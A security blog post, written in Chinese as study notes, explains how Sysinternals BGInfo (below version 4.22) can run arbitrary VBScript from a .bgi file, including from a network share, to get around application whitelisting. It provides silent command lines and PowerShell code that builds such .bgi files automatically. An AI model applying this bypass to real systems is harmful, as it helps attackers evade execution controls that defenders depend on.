---
layout: post
title: Study Notes of using BGInfo to bypass Application Whitelisting
---



## 0x00 前言
---

最近看到一篇有趣的文章《Bypassing Application Whitelisting with BGInfo》，介绍了如何通过BGInfo实现白名单绕过，我对此很感兴趣，于是对这部分内容做了学习整理，同时开源了一个powershell脚本，用于自动生成.bgi文件


文章地址如下：

https://msitpros.com/?p=3831

## 0x01 简介
---

本文将要介绍如下内容：

- Bginfo简介
- 通过Bginfo绕过白名单的实际操作
- 如何使用powershell编辑二进制文件
- 如何开发powershell脚本自动生成.bgi文件

## 0x02 Bginfo
---

Bginfo—强大的Windows系统信息显示工具,出自Sysinternals套件

**下载地址：**

https://technet.microsoft.com/en-us/sysinternals/bb897557.aspx

**注：**

bginfo.exe最新版本为4.22，本文测试版本为4.21

### 1、简介

可以自动在桌面的一个区域中显示当前Windows环境信息

面板如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-1.png)

设置后，桌面显示Windows环境信息，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-2.png)

编辑要显示的信息，可将其保存为`config.bgi`，使用时将其导入就好

### 2、Bginfo命令行模式

/h 弹出帮助

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-3.png)


通过命令行设置桌面显示信息的命令如下：

`bginfo.exe config.bgi /timer:0 /nolicprompt /silent`


### 3、扩展：

点击Custom可自定义桌面显示内容，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-4.png)

选择New

设置数据源，包括环境变量、注册表键值、WMI、文件、VB Script脚本

### 4、导入WMI查询：

添加一个WMI查询，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-5.png)

在面部添加显示内容，修改桌面，成功显示新内容，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-6.png)


### 5、导入VBS：

添加一个vbs查询,vbs脚本可参考：

https://gist.githubusercontent.com/api0cradle/efc90f8318556f0737791b6d73a4ec8b/raw/9a46f4cdacb5752e721e1e3701308939351b4768/gistfile1.txt

该vbs脚本实现：

- 启动cmd.exe
- 在桌面输出："Does not matter what this says"

导入该vbs脚本后，点击Apply，成功弹出cmd.exe，并在桌面输出`Does not matter what this says`

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/2-7.png)

整个启动过程还可在cmd下实现

(1) 将上述bgi工程保存为vbs.bgi

(2) cmd：

`bginfo.exe vbs.bgi /timer:0 /nolicprompt /silent`

### 6、bginfo.exe和vbs.bgi可以放在远程服务器，通过网络共享访问执行

cmd：

`\\WIN-FVJLPTISCFE\test\bginfo.exe \\WIN-FVJLPTISCFE\test\test1.bgi /timer:0 /nolicprompt /silent`

完整操作如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/3-1.gif)

## 0x03 通过Bginfo绕过白名单
---

**完整过程如下：**

1、启动bginfo.exe，添加导入vbs脚本功能，设置vbs脚本路径，去掉桌面显示内容

2、将bgi工程保存为.bgi文件

3、命令行执行代码：

`bginfo.exe vbs.bgi /timer:0 /nolicprompt /silent`

**注：**

bginfo.exe的版本需要低于4.22，版本4.22已经修复上述问题

整个绕过过程很简单，但是步骤1和步骤2比较麻烦，通过`UltraEdit`查看vbs.bgi，内容如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/4-1.png)

看起来遵循一定的格式，那么能否通过powershell脚本实现自动生成.bgi文件呢？

## 0x04 bgi文件格式
---

通过文件比较来猜测bgi文件格式


使用16进制文件比较工具：`Beyond Compare`

分别设置不同的vbs路径，对比差别，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/4-2.png)

不难发现，差异只存在于0x00000301和0x00000306开始的vbs路径

0x00000000-0x0x00000300为固定格式

字符串`C：\test\1.vbs`的长度为13，0x00000301标志位数值为0x0F，10进制为15

字符串`C：\test\cmd.vbs`的长度为15，0x00000301标志位数值为0x11，10进制为17

**大胆猜测：**

0x00000301的标志位表示内容为：vbs路径长度+2，并转换成16进制保存

**注：**

vbs路径`C：\test\1.vbs`中的磁盘目录`C`需要大写，否则提示文件格式错误

## 0x05 如何使用powershell编辑二进制文件
---

使用powershell读写文件，最常用的方式为：

读文件： `Get-content`
写文件： `Set-content`

然而，对于不是txt的文件，如果存在特殊字符，通过以上方法会出现bug，自动过滤特殊字符串，导致长度不同，内容出错

读写二进制文件方法：

读二进制文件：

`[System.IO.File]::ReadAllBytes('1.txt')`

写二进制文件：

`[System.IO.File]::WriteAllBytes("1.txt",$fileContentBytes)`

修改二进制文件：

使用`system.io.filestream`

代码如下：

```
$fs=new-object io.filestream "test1.bgi",open
$fs.seek(0,2)
$fs.writebyte(0x00)
$fs.flush()
$fs.close()
```

**参数说明：**

$fs=new-object io.filestream "test1.bgi",open：

- open表示追加，createnew表示新建

$fs.seek(0,2)：

- 第一个参数表示偏移
- 第二个参数：0表示以文件开头作为起点，1表示以当前位置作为起点，2表示以文件末尾作为起点

## 0x06 编写powershell脚本实现自动生成.bgi文件
---

**开发思路：**

读取0x00000000-0x0x00000300内容，作base64编码并保存在变量$fileContent中

对变量$fileContent作base64解码，写入新文件test1.bgi

使用追加方式向文件依次写入标志位，vbs路径和其他填充位

**流程如下:**

- 写入0x00000000-0x0x00000300内容
- 计算标志位
- 以二进制方式写入标志位
- 使用Out-File向文件追加写入vbs路径，但是会存在冗余数据0D0A
- 偏移-2，以二进制方式填充其他位置，覆盖冗余数据0D0A

**关键代码如下:**

将0x00000000-0x0x00000300内容保存为1.bgi

powershell代码：

```
$fileContent = [System.IO.File]::ReadAllBytes('1.bgi')
$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("buffer.txt") 
```

生成buffer.txt，内容如下：

`CwAAAEJhY2tncm91bmQABAAAAAQAAAAAAAAACQAAAFBvc2l0aW9uAAQAAAAEAAAA/gMAAAgAAABNb25pdG9yAAQAAAAEAAAAXAQAAA4AAABUYXNrYmFyQWRqdXN0AAQAAAAEAAAAAQAAAAsAAABUZXh0V2lkdGgyAAQAAAAEAAAAwHsAAAsAAABPdXRwdXRGaWxlAAEAAAASAAAAJVRlbXAlXEJHSW5mby5ibXAACQAAAERhdGFiYXNlAAEAAAABAAAAAAwAAABEYXRhYmFzZU1SVQABAAAABAAAAAAAAAAKAAAAV2FsbHBhcGVyAAEAAAABAAAAAA0AAABXYWxscGFwZXJQb3MABAAAAAQAAAACAAAADgAAAFdhbGxwYXBlclVzZXIABAAAAAQAAAABAAAADQAAAE1heENvbG9yQml0cwAEAAAABAAAAAAAAAAMAAAARXJyb3JOb3RpZnkABAAAAAQAAAAAAAAACwAAAFVzZXJTY3JlZW4ABAAAAAQAAAABAAAADAAAAExvZ29uU2NyZWVuAAQAAAAEAAAAAAAAAA8AAABUZXJtaW5hbFNjcmVlbgAEAAAABAAAAAAAAAAOAAAAT3BhcXVlVGV4dEJveAAEAAAABAAAAAAAAAAEAAAAUlRGAAEAAADvAAAAe1xydGYxXGFuc2lcYW5zaWNwZzkzNlxkZWZmMFxkZWZsYW5nMTAzM1xkZWZsYW5nZmUyMDUye1xmb250dGJse1xmMFxmbmlsXGZjaGFyc2V0MTM0IEFyaWFsO319DQp7XGNvbG9ydGJsIDtccmVkMjU1XGdyZWVuMjU1XGJsdWUyNTU7fQ0KXHZpZXdraW5kNFx1YzFccGFyZFxmaS0yODgwXGxpMjg4MFx0eDI4ODBcY2YxXGxhbmcyMDUyXGJccHJvdGVjdFxmMFxmczI0IDx2YnM+XHByb3RlY3QwXHBhcg0KXHBhcg0KfQ0KAAALAAAAVXNlckZpZWxkcwAAgACAAAAAAAQAAAB2YnMAAQAAAA==`

将其保存在变量$fileContent中，解密并写入文件test1.bgi

```
$fileContent = "CwAAAEJhY2tncm91bmQABAAAAAQAAAAAAAAACQAAAFBvc2l0aW9uAAQAAAAEAAAA/gMAAAgAAABNb25pdG9yAAQAAAAEAAAAXAQAAA4AAABUYXNrYmFyQWRqdXN0AAQAAAAEAAAAAQAAAAsAAABUZXh0V2lkdGgyAAQAAAAEAAAAwHsAAAsAAABPdXRwdXRGaWxlAAEAAAASAAAAJVRlbXAlXEJHSW5mby5ibXAACQAAAERhdGFiYXNlAAEAAAABAAAAAAwAAABEYXRhYmFzZU1SVQABAAAABAAAAAAAAAAKAAAAV2FsbHBhcGVyAAEAAAABAAAAAA0AAABXYWxscGFwZXJQb3MABAAAAAQAAAACAAAADgAAAFdhbGxwYXBlclVzZXIABAAAAAQAAAABAAAADQAAAE1heENvbG9yQml0cwAEAAAABAAAAAAAAAAMAAAARXJyb3JOb3RpZnkABAAAAAQAAAAAAAAACwAAAFVzZXJTY3JlZW4ABAAAAAQAAAABAAAADAAAAExvZ29uU2NyZWVuAAQAAAAEAAAAAAAAAA8AAABUZXJtaW5hbFNjcmVlbgAEAAAABAAAAAAAAAAOAAAAT3BhcXVlVGV4dEJveAAEAAAABAAAAAAAAAAEAAAAUlRGAAEAAADvAAAAe1xydGYxXGFuc2lcYW5zaWNwZzkzNlxkZWZmMFxkZWZsYW5nMTAzM1xkZWZsYW5nZmUyMDUye1xmb250dGJse1xmMFxmbmlsXGZjaGFyc2V0MTM0IEFyaWFsO319DQp7XGNvbG9ydGJsIDtccmVkMjU1XGdyZWVuMjU1XGJsdWUyNTU7fQ0KXHZpZXdraW5kNFx1YzFccGFyZFxmaS0yODgwXGxpMjg4MFx0eDI4ODBcY2YxXGxhbmcyMDUyXGJccHJvdGVjdFxmMFxmczI0IDx2YnM+XHByb3RlY3QwXHBhcg0KXHBhcg0KfQ0KAAALAAAAVXNlckZpZWxkcwAAgACAAAAAAAQAAAB2YnMAAQAAAA=="
$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
[System.IO.File]::WriteAllBytes("test1.bgi",$fileContentBytes)
```

标志位计算：

```
$VbsPath="C:\test\1.vbs"
$Length=$VbsPath.Length+2
```

写入长度标志位+空闲填充位

```
$fs=new-object io.filestream "test1.bgi",open
$fs.seek(0,2)
$fs.writebyte($Length)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x34)
$fs.flush()
$fs.close()
```

追加写入vbs脚本路径：

```
$VbsPath | Out-File -Encoding ascii -Append test1.bgi
```

存在冗余数据0D0A，所以偏移应该为-2，写入空闲填充位：

```
$fs=new-object io.filestream "test1.bgi",open
$fs.seek(-2,2)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x01)
$fs.writebyte(0x80)
$fs.writebyte(0x00)
$fs.writebyte(0x80)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.writebyte(0x00)
$fs.flush()
$fs.close()
```

完整代码已上传至github：

https://github.com/3gstudent/bgi-creater

完整操作如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-25/5-1.gif)

## 0x07 小结
---

本文介绍了通过BGInfo实现白名单绕过的方法，同时介绍了通过powershell编辑二进制文件的方法，开源了一个powershell生成.bgi文件的脚本，希望能够帮助大家



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
